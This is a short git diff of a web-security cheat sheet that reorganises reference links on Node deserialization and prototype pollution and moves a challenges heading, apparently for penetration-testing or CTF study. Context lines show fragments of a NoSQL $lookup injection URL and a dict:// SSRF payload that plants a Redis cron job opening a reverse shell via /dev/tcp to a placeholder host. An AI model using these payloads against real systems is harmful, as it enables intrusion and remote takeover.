@@ -470,9 +470,16 @@ https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22fl
 - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 - https://www.synacktiv.com/publications/java-deserialization-tricks
 
-### Node - serialize
+### Node 
+
+#### Serialize
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md
+
+#### Prototype Pollution
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
+- https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html
 
 ### PHP
 
@@ -571,15 +578,11 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 - `Protection/Sanitazation`:
 	- https://github.com/cure53/DOMPurify
 
-	
-#### Client-Side Prototype pollution
 
-- https://github.com/BlackFan/client-side-prototype-pollution
-
-
-### Challenges
+## Challenges
 
 - https://alert.zeyu2001.com/
+
 
 ## Tools (Obfu)
 
